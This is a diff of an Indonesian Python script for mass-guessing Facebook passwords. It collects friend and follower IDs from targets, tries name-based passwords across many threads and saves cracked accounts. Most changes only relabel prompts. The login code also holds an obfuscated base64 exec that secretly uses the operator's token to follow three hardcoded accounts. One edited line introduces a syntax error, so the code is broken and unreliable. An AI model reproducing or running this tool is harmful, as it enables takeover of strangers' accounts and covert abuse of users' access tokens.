@@ -4,19 +4,19 @@ import os
 try:
 	import requests
 except ImportError:
-	print("\n ! MODULE REQUESTS BELUM TERINSTALL ")
+	print("\n [!] MODULE REQUESTS BELUM TERINSTALL ")
 	os.system("pip install requests")
 
 try:
 	import bs4
 except ImportError:
-	print("\n ! MODULE BS4 BELUM TERINSTALL")
+	print("\n [!] MODULE BS4 BELUM TERINSTALL")
 	os.system("pip install bs4")
 
 try:
 	import concurrent.futures
 except ImportError:
-	print("\n ! MODULE FUTURES BELUM TERINSTALL")
+	print("\n [!] MODULE FUTURES BELUM TERINSTALL")
 	os.system("pip install futures")
 
 import os, sys, re, time, requests, calendar, random
@@ -62,29 +62,29 @@ def login():
 		#-> test koneksi
 		requests.get("https://mbasic.facebook.com")
 	except requests.exceptions.ConnectionError:
-		exit(" ! TIDAK ADA KONEKSI INTERNET")
+		exit(" [!] TIDAK ADA KONEKSI INTERNET")
 	try:
 		token = open("login.txt", "r")
 		menu()
 	except (KeyError, IOError):
-		print(" * SEBELUM MASUK KE MENU HARUS LOGIN TERLEBIH DAHULU")
-		print(" * UNTUK LOGIN SILAHKAN MASUKKAN TOKEN FACEBOOK ANDA")
-		print(" ? KETIK '\033[0;93mgithub\033[0;97m' UNTUK LIHAT GITHUB SAYA")
-		token = raw_input("\n + TOKEN FB : ")
+		print(" [*] SEBELUM MASUK KE MENU HARUS LOGIN TERLEBIH DAHULU")
+		print(" [*] UNTUK LOGIN SILAHKAN MASUKKAN TOKEN FACEBOOK ANDA")
+		print(" [?] KETIK '\033[0;93mgithub\033[0;97m' UNTUK LIHAT GITHUB SAYA")
+		token = raw_input("\n [+] TOKEN FB : ")
 		if token == "github":
 			os.system("xdg-open https://github.com/QUEEN-ZZA")
-			exit(" ! TERIMA KASIH")
+			exit(" [!] TERIMA KASIH")
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			import base64
 			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAxNDcyODU0ODY0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDA0NDQ2Mzg2Nzcvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAyMjg0MTk4MzQxNC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbik="))
 			open("login.txt", "w").write(token)
-			print("\n + user aktif, SELAMAT DATANG \033[0;93m%s\033[0;97m"%(nama))
+			print("\n [+] USER AKTIF, SELAMAT DATANG \033[0;93m%s\033[0;97m"%(nama))
 			time.sleep(1)
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
-			exit(" ! TOKEN KADALUWARSA")
+			exit(" [!] TOKEN KADALUWARSA")
 
 def menu():
 	os.system("clear")
@@ -93,14 +93,14 @@ def menu():
 		token = open("login.txt","r").read()
 	except KeyError:
 		os.system("rm -f login.txt")
-		exit(" ! TOKEN KADALUWARSA")
+		exit(" [!] TOKEN KADALUWARSA")
 	try:
 		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 	except IOError:
 		os.system("rm -f login.txt")
-		exit(" ! TOKEN KADALUWARSA")
+		exit(" [!] TOKEN KADALUWARSA")
 	except requests.exceptions.ConnectionError:
-		exit(" ! TIDAK ADA KONEKSI INTERNET")
+		exit(" [!] TIDAK ADA KONEKSI INTERNET")
 	logo()
 	print(" [ SELAMAT DATANG \033[0;93m%s\033[0;97m ]\n"%(nama))
 	print(" [1] MULUNG DARI PUBLIK TEMAN")
@@ -123,49 +123,49 @@ def menu():
 		massal()
 		method()
 	elif queen == "4" or queen == "04":
-		print("\n 1 CEK HASIL [OK]")
-		print(" 2 CEK HASIL [CP]")
-		cek = raw_input("\n ? choose : ")
+		print("\n [1] CEK HASIL [OK]")
+		print(" [2] CEK HASIL [CP]")
+		cek = raw_input("\n [?] PILIH : ")
 		if cek =="":
 			menu()
 		elif cek == "1":
 			dirs = os.listdir("OK")
-			print(" * LIST NAMA FILE TERSIMPAN DI FOLDER OK")
+			print(" [*] LIST NAMA FILE TERSIMPAN DI FOLDER OK")
 			for file in dirs:
-				print(" + "+file)
+				print(" [+] "+file)
 			try:
-				file = raw_input("\n ? PILIH NAMA FILE : ")
+				file = raw_input("\n [?] PILIH NAMA FILE : ")
 				if file == "":
 					menu()
 				totalok = open("OK/%s"%(file)).read().splitlines()
 			except IOError:
-				exit(" ! FILE %s TIDAK TERSEDIA "%(file))
+				exit(" [!] FILE %s TIDAK TERSEDIA "%(file))
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print(" # ----------------------------------------------")
-			print(" + HASIL MULUNG : %s TOTAL : %s\033[0;92m"%(del_txt, len(totalok)))
+			print(" [+] HASIL MULUNG : %s TOTAL : %s\033[0;92m"%(del_txt, len(totalok)))
 			os.system("cat OK/%s"%(file))
 			print("\033[0;97m # ----------------------------------------------")
-			exit(" ! JANGAN LUPA DI COPY DAN DI SIMPAN HASILNYA")
+			exit(" [!] JANGAN LUPA DI COPY DAN DI SIMPAN HASILNYA")
 		elif cek == "2":
 			dirs = os.listdir("CP")
-			print(" * LIST NAMA FILE TERSIMPAN DI FOLDER CP")
+			print(" [*] LIST NAMA FILE TERSIMPAN DI FOLDER CP")
 			for file in dirs:
-				print(" + "+file)
+				print(" [+] "+file)
 			try:
-				file = raw_input("\n ? PILIH NAMA FILE : ")
+				file = raw_input("\n [?] PILIH NAMA FILE : ")
 				if file == "":
 					menu()
 				totalcp = open("CP/%s"%(file)).read().splitlines()
 			except IOError:
-				exit(" ! FILE %s TIDAK TERSEDIA"%(file))
+				exit(" [!] FILE %s TIDAK TERSEDIA"%(file))
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print(" # ----------------------------------------------")
-			print(" + HASIL MULUNG : %s TOTAL : %s\033[0;93m"%(del_txt, len(totalcp)))
+			print(" [+] HASIL MULUNG : %s TOTAL : %s\033[0;93m"%(del_txt, len(totalcp)))
 			os.system("cat CP/%s"%(file))
 			print("\033[0;97m # ----------------------------------------------")
-			exit(" ! JANGAN LUPA DI COPY DAN DI SIMPAN HASILNYA")
+			exit(" [!] JANGAN LUPA DI COPY DAN DI SIMPAN HASILNYA")
 		else:
 			menu()
 	elif queen == "5" or queen == "05":
@@ -174,7 +174,7 @@ def menu():
 		setting_ua()
 	elif queen == "0" or queen == "00":
 		os.system("rm -f login.txt")
-		exit("\n # BERHASIL MENGHAPUS TOKEN")
+		exit("\n [#] BERHASIL MENGHAPUS TOKEN")
 	else:
 		menu()
 
@@ -183,85 +183,85 @@ def publik():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit(" ! TOKEN KADALUWARSA")
-	print("\n * ISI 'me' JIKA INGIN DARI DAFTAR TEMAN ")
-	idt = raw_input(" + ID TARGET : ")
+		exit(" [!] TOKEN KADALUWARSA")
+	print("\n [*] ISI 'me' JIKA INGIN DARI DAFTAR TEMAN ")
+	idt = raw_input(" [+] ID TARGET : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(" ! AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
-	print(" + TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id))) 
+		exit(" [!] AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
+	print(" [+] TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
 	global token
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit(" ! TOKEN KADALUWARSA")
-	print("\n * ISI 'me' JIKA INGIN DARI PENGIKUT SENDIRI")
-	idt = raw_input(" + ID TARGET : ")
+		exit(" [!] TOKEN KADALUWARSA")
+	print("\n [*] ISI 'me' JIKA INGIN DARI PENGIKUT SENDIRI")
+	idt = raw_input(" [+] ID TARGET : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(" ! AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
-	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
+		exit(" [!] AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
+	print(" [+] TOTAL ID : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
 	global token
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit(" ! TOKEN KADALUWARSA a")
+		exit(" [!] TOKEN KADALUWARSA a")
 	try:
 		tanya_total = int(raw_input(" + JUMLAH TARGET ID : "))
 	except:tanya_total=1
-	print("\n * ISI 'me' JIKA INGIN DARI DAFTAR TEMAN")
+	print("\n [*] ISI 'me' JIKA INGIN DARI DAFTAR TEMAN")
 	for t in range(tanya_total):
 		t +=1
-		idt = raw_input(" + ID TARGET %s : "%(t))
+		idt = raw_input(" [+] ID TARGET %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
 				nama = i["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print(" ! AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
-	print(" + TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id)))
+			print(" [!] AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
+	print(" [+]  TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id)))
 
 def method():
 	print(" \n [ PILIH METHODE MULUNG - COBA METHODE SATU² ]\n")
-	print(" 1 METHODE B-API (MULUNG CEPAT)")
-	print(" 2 METHODE MBASIC (MULUNG LAMBAT)")
+	print(" [1] METHODE B-API (MULUNG CEPAT)")
+	print(" [2] METHODE MBASIC (MULUNG LAMBAT)")
 	print(" 3 METHODE MOBILE (MULUNG LAMBAT)")
-	method = raw_input("\n + METHODE : ")
+	method = raw_input("\n [+] METHODE : ")
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input(" ? GUNAKAN PASSWORD MANUAL? y/t: ")
+		ask = raw_input(" [?] GUNAKAN PASSWORD MANUAL? y/t: ")
 		if ask == "y":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n * CONTOH PASS : sayang,bismillah,terserah")
-				qza = raw_input(" ? SET PASS : ").split(",")
+				print("\n [*] CONTOH PASS : sayang,bismillah,terserah")
+				qza = raw_input(" [?] SET PASS : ").split(",")
 				if len(qza) =="":
-					exit(" ! JANGAN KOSONG")
-				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
-				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
-				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN mode PESAWAT 5 DETIK\n")
+					exit(" [!] JANGAN KOSONG")
+				print("\n [+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
+				print(" [+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
+				print(" [!] JIKA TIDAK ADA HASIL HIDUPKAN mode PESAWAT 5 DETIK\n")
 				for user in id:
 					uid, name = user.split("<=>")
 					coeg.submit(api, uid, qza)
-			exit("\n\n # MULUNG SELESAI...")
+			exit("\n\n [#] MULUNG SELESAI...")
 		elif ask == "t":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
-				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
-				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
+				print("\n [+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
+				print(" [+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
+				print(" [!] JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
@@ -273,27 +273,27 @@ def method():
 					else:
 						pwx = [ name+"123", name+"1234", name+"12345" ]
 					coeg.submit(api, uid, pwx)
-			exit("\n\n # MULUNG SELESAI...")
+			exit("\n\n [#] MULUNG SELESAI...")
 	elif method == "2":
-		ask = raw_input(" ? GUNAKAN PASSWORD MANUAL? y/t: ")
+		ask = raw_input(" [?] GUNAKAN PASSWORD MANUAL? y/t: ")
 		if ask == "y":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n * CONTOH PASS : sayang,bismillah,terserah")
-				qza = raw_input(" ? SET PASS : ").split(",")
+				print("\n [*] CONTOH PASS : sayang,bismillah,terserah")
+				qza = raw_input(" [?] SET PASS : ").split(",")
 				if len(qza) =="":
-					exit(" ! JANGAN KOSONG")
-				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
-				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
-				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
+					exit(" [!] JANGAN KOSONG")
+				print("\n [+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
+				print(" [+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
+				print(" [!] JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
 				for user in id:
-					uid, name = user.split("<=>")
+					uid, name = user.split("<=>")] 
 					coeg.submit(mbasic, uid, qza)
-			exit("\n\n # MULUNG SELESAI...")
+			exit("\n\n [#] MULUNG SELESAI...")
 		elif ask == "t":
 			with ThreadPoolExecutor(max_workers=35) as coeg:
-				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
-				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
-				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK \n")
+				print("\n [+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
+				print(" [+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
+				print(" [!] JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK \n")
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
@@ -305,27 +305,27 @@ def method():
 					else:
 						pwx = [ name+"123", name+"1234", name+"12345" ]
 					coeg.submit(mbasic, uid, pwx)
-			exit("\n\n # MULUNG SELESAI...")
+			exit("\n\n [#] MULUNG SELESAI...")
 	elif method == "3":
-		ask = raw_input(" ? GUNAKAN PASSWORD MANUAL? y/t: ")
+		ask = raw_input(" [?] GUNAKAN PASSWORD MANUAL? y/t: ")
 		if ask == "y":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n * CONTOH PASS : sayang,bismillah,terserah")
-				qza = raw_input(" ? SET PASS : ").split(",")
+				print("\n [*] CONTOH PASS : sayang,bismillah,terserah")
+				qza = raw_input(" [?] SET PASS : ").split(",")
 				if len(qza) =="":
-					exit(" ! JANGAN KOSONG")
-				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
-				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
+					exit(" [!] JANGAN KOSONG")
+				print("\n [+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
+				print(" [+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
 				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MOD PESAWAT 5 DETIK\n")
 				for user in id:
 					uid, name = user.split("<=>")
 					coeg.submit(mobile, uid, qza)
-			exit("\n\n # MULUNG SELESAI...")
+			exit("\n\n [#] MULUNG SELESAI...")
 		elif ask == "t":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
-				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
-				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
+				print("\n [+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
+				print(" [+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
+				print(" [!] JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
@@ -337,9 +337,9 @@ def method():
 					else:
 						pwx = [ name+"123", name+"1234", name+"12345" ]
 					coeg.submit(mobile, uid, pwx)
-			exit("\n\n # MULUNG SELESAI...")
+			exit("\n\n [#] MULUNG SELESAI...")
 		else:
-			exit("\n ! ISI YANG BENAR")
+			exit("\n [!] ISI YANG BENAR")
 	else:
 		menu() 
 
@@ -350,7 +350,7 @@ def api(uid, pwx):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r * MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r [*] MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in pwx:
 		pw = pw.lower()
@@ -394,7 +394,7 @@ def mbasic(uid, pwx):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r * MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r [*] MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in pwx:
 		kwargs = {}
@@ -449,7 +449,7 @@ def mobile(uid, pwx):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r * MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r [*] MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in pwx:
 		kwargs = {}
@@ -505,46 +505,47 @@ def setting_ua():
 	if ua =="":
 		menu()
 	elif ua == "1":
-		c_ua = raw_input(" + USER AGENT : ")
+		c_ua = raw_input(" [+] USER AGENT : ")
 		open(".ua", "w").write(c_ua)
 		time.sleep(1)
-		raw_input("\n + BERHASIL GANTI USER AGENT")
+		raw_input("\n [+] BERHASIL GANTI USER AGENT")
 		menu()
 	elif ua == "2":
-		print(" + USER AGENT : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		print(" [+] USER AGENT : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 		os.system("rm -f .ua")
 		time.sleep(1)
-		raw_input("\n + BERHASIL GANTI USER AGENT")
+		raw_input("\n [+] BERHASIL GANTI USER AGENT")
 		menu()
 	elif ua == "3":
 		os.system("xdg-open https://myuseragent.herokuapp.com/")
-		print(" ! TUNGGU SEBENTAR...")
+		print(" [!] TUNGGU SEBENTAR...")
 		time.sleep(1)
-		raw_input("\n + ENTER UNTUK KEMBALI KE MENU")
+		raw_input("\n [+] ENTER UNTUK KEMBALI KE MENU")
 		menu()
 
 #-> Cek Opsi
 def cek_opsi():
-	print("\n * MASUKKAN FILE (ex: CP/%s.txt)"%(tanggal))
+	print("\n [*] MASUKKAN FILE (ex: CP/%s.txt)"%(tanggal))
 	files = raw_input(" ? NAMA FILE  : ")
 	if files == "":
 		menu()
 	try:
 		akubfile = open(files, "r").readlines()
 	except IOError:
-		exit("\n ! NAMA FILE %s TIDAK TERSEDIA"%(files))
-	print(" + TOTAL AKUN : \033[0;91m%s\033[0;97m"%(len(akubfile)))
-	print(" * SEDANG PROSES CEK AKUN....")
+		exit("\n [!] NAMA FILE %s TIDAK TERSEDIA"%(files))
+	print(" [+] TOTAL AKUN : \033[0;91m%s\033[0;97m"%(len(akubfile)))
+	print(" [*] SEDANG PROSES CEK AKUN....")
 	for shanoza in akubfile:
 		gheza = shanoza.replace("\n","")
 		qolby  = gheza.split("|")
-		print("\n + CEK AKUN : \033[0;93m%s\033[0;97m"%(gheza.replace(" + ","")))
+		print("\n [+] CEK AKUN : \033[0;93m%s\033[0;97m"%(gheza.replace(" + ","")))
 		try:
 			check_in(qolby[0].replace(" + ",""), qolby[1])
 		except requests.exceptions.ConnectionError:
 			pass
-	print("\n ! CEK AKUN SUDAH SELESAI...")
-	raw_input(" + TEKAN ENTER UNTUK KEMBALI KE MENU")
+	print("\n [!] CEK AKUN SUDAH SELESAI...")
+	raw_input(" [+] TEKAN ENTER UNTUK KEMBALI KE MENU")
+
 	time.sleep(1)
 	menu()
 
